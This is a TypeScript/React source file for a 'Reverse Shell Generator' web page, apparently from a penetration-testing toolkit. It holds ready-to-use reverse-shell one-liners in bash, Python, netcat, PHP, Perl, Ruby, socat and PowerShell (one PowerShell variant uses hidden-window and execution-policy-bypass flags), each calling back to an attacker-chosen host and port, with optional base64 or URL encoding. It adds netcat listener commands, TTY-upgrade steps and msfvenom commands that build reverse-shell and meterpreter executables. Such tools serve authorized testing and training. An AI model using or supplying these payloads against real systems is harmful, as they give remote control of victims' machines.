"use client";

import { Check, Copy } from "lucide-react";
import { useMemo, useState } from "react";
import toast from "react-hot-toast";

type ShellType =
  | "bash"
  | "bash2"
  | "python3"
  | "python2"
  | "nc-e"
  | "nc-mkfifo"
  | "php"
  | "perl"
  | "ruby"
  | "socat"
  | "powershell"
  | "powershell2";
type Encoding = "none" | "base64" | "urlencode";

function generate(type: ShellType, ip: string, port: string): string {
  const i = ip || "LHOST";
  const p = port || "LPORT";
  const shells: Record<ShellType, string> = {
    bash: `bash -i >& /dev/tcp/${i}/${p} 0>&1`,
    bash2: `bash -c 'bash -i >& /dev/tcp/${i}/${p} 0>&1'`,
    python3: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    python2: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    "nc-e": `nc -e /bin/sh ${i} ${p}`,
    "nc-mkfifo": `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${p} >/tmp/f`,
    php: `php -r '$sock=fsockopen("${i}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    perl: `perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    ruby: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${i}","${p}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
    socat: `socat TCP:${i}:${p} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`,
    powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('${i}',${p});$s=$_.GetStream();[byte[]]$b=0..65535|%{0};while(($r=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$r);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$send=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($send,0,$send.Length);$s.Flush()}`,
    powershell2: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('${i}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i2=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i2);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback + 'PS ' + (pwd).Path + '> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  };
  return shells[type];
}

function encodeShell(text: string, mode: Encoding): string {
  if (mode === "none") return text;
  if (mode === "base64") return btoa(text);
  return encodeURIComponent(text);
}

export default function RevShellPage() {
  const [ip, setIp] = useState("");
  const [port, setPort] = useState("4444");
  const [type, setType] = useState<ShellType>("bash");
  const [encoding, setEncoding] = useState<Encoding>("none");
  const [copied, setCopied] = useState<string>("");

  const generated = useMemo(() => encodeShell(generate(type, ip, port), encoding), [encoding, ip, port, type]);
  const listeners = [`nc -lvnp ${port || "LPORT"}`, `rlwrap nc -lvnp ${port || "LPORT"}`];
  const tty = [
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "Ctrl+Z + stty raw -echo; fg",
    "export TERM=xterm",
    "stty rows 40 cols 200",
  ];
  const msf = [
    `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f elf -o rev.elf`,
    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f exe -o rev.exe`,
    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f exe -o meter.exe`,
    `msfvenom -p php/reverse_php LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f raw -o rev.php`,
    `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f raw -o rev.jsp`,
    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip || "LHOST"} LPORT=${port || "LPORT"} -f msi -o rev.msi`,
  ];

  const copy = async (value: string, key: string) => {
    await navigator.clipboard.writeText(value);
    setCopied(key);
    toast.success("Copied!");
    setTimeout(() => setCopied(""), 2000);
  };

  const shellButtons: { type: ShellType; label: string; os: string }[] = [
    { type: "bash", label: "bash", os: "linux" },
    { type: "bash2", label: "bash2", os: "linux" },
    { type: "python3", label: "python3", os: "any" },
    { type: "python2", label: "python2", os: "any" },
    { type: "nc-e", label: "nc -e", os: "linux" },
    { type: "nc-mkfifo", label: "nc mkfifo", os: "linux" },
    { type: "php", label: "php", os: "any" },
    { type: "perl", label: "perl", os: "any" },
    { type: "ruby", label: "ruby", os: "any" },
    { type: "socat", label: "socat", os: "linux" },
    { type: "powershell", label: "powershell", os: "windows" },
    { type: "powershell2", label: "powershell #2", os: "windows" },
  ];

  return (
    <div className="space-y-6">
      <header className="color-panel rounded-md p-4">
        <h1 className="font-heading text-3xl text-gradient-brand">Reverse Shell Generator</h1>
        <p className="text-sm text-dim">
          Build <span className="text-success">shells</span>, <span className="text-core">listeners</span>,{" "}
          <span className="text-violet">TTY upgrades</span>, and <span className="text-post">msfvenom</span> payloads fast.
        </p>
      </header>
      <div className="grid gap-6 xl:grid-cols-2">
        <div className="space-y-4">
          <div className="color-panel rounded-md p-4">
            <h2 className="mb-3 font-mono text-sm text-violet">Connection Details</h2>
            <div className="grid gap-3 sm:grid-cols-2">
              <input value={ip} onChange={(e) => setIp(e.target.value)} placeholder="10.10.14.1" className="rounded border border-violet/40 bg-surface px-3 py-2 text-success outline-none focus:border-core" spellCheck={false} autoComplete="off" />
              <input value={port} onChange={(e) => setPort(e.target.value)} placeholder="4444" className="rounded border border-violet/40 bg-surface px-3 py-2 text-success outline-none focus:border-core" spellCheck={false} autoComplete="off" />
            </div>
          </div>

          <div className="color-panel rounded-md p-4">
            <h2 className="mb-3 font-mono text-sm text-violet">Shell Type</h2>
            <div className="grid grid-cols-2 gap-2">
              {shellButtons.map((s) => (
                <button key={s.type} onClick={() => setType(s.type)} className={`rounded border px-3 py-2 text-left font-mono text-xs ${type === s.type ? "border-core bg-core/10 text-core" : "border-border bg-surface2 text-dim hover:border-violet/50 hover:text-bright"}`}>
                  {s.label} <span className="text-[10px] opacity-70">({s.os})</span>
                </button>
              ))}
            </div>
          </div>

          <div className="color-panel rounded-md p-4">
            <h2 className="mb-3 font-mono text-sm text-violet">Encoding</h2>
            <div className="flex gap-2">
              {(["none", "base64", "urlencode"] as Encoding[]).map((enc) => (
                <button key={enc} onClick={() => setEncoding(enc)} className={`rounded border px-3 py-1 font-mono text-xs uppercase ${encoding === enc ? "border-violet bg-violet/10 text-violet" : "border-border bg-surface2 text-dim"}`}>{enc}</button>
              ))}
            </div>
          </div>
        </div>

        <div className="space-y-4">
          <div className="color-panel rounded-md p-4">
            <div className="mb-3 flex items-center justify-between">
              <h2 className="font-mono text-sm text-success">Generated Shell</h2>
              <button onClick={() => copy(generated, "generated")} className="inline-flex items-center gap-1 rounded border border-success/50 bg-success/10 px-2 py-1 text-xs text-success">
                {copied === "generated" ? <Check size={12} /> : <Copy size={12} />} COPY
              </button>
            </div>
            <pre className="whitespace-pre-wrap break-all font-mono text-sm text-success">{!ip || !port ? "Enter LHOST and LPORT to generate payload..." : generated}</pre>
          </div>

          <div className="color-panel rounded-md p-4">
            <h2 className="mb-3 font-mono text-sm text-core">Listener Commands</h2>
            <div className="space-y-2">
              {listeners.map((l, idx) => (
                <div key={l} className="flex items-center justify-between rounded border border-border bg-surface2 px-3 py-2">
                  <code className="font-mono text-sm text-bright">{l}</code>
                  <button onClick={() => copy(l, `l-${idx}`)} className="text-dim hover:text-core"><Copy size={14} /></button>
                </div>
              ))}
            </div>
          </div>

          <div className="color-panel rounded-md p-4">
            <h2 className="mb-3 font-mono text-sm text-violet">TTY Upgrade</h2>
            <div className="space-y-2">
              {tty.map((line, idx) => (
                <div key={line} className="flex items-center justify-between rounded border border-border bg-surface2 px-3 py-2">
                  <code className="font-mono text-xs text-bright">{line}</code>
                  <button onClick={() => copy(line, `tty-${idx}`)} className="text-dim hover:text-violet"><Copy size={14} /></button>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      <section>
        <h2 className="mb-3 font-heading text-xl text-post">MSFvenom Quick Builder</h2>
        <div className="grid gap-3 md:grid-cols-2 xl:grid-cols-3">
          {msf.map((cmd, idx) => (
            <div key={cmd} className="color-panel rounded-md p-3">
              <p className="mb-2 font-mono text-xs text-dim">Payload {idx + 1}</p>
              <p className="mb-3 break-all font-mono text-xs text-success">{cmd}</p>
              <button onClick={() => copy(cmd, `msf-${idx}`)} className="inline-flex items-center gap-1 rounded border border-border bg-surface2 px-2 py-1 text-xs text-dim hover:border-post/60 hover:text-post">
                {copied === `msf-${idx}` ? <Check size={12} /> : <Copy size={12} />} COPY
              </button>
            </div>
          ))}
        </div>
      </section>
    </div>
  );
}
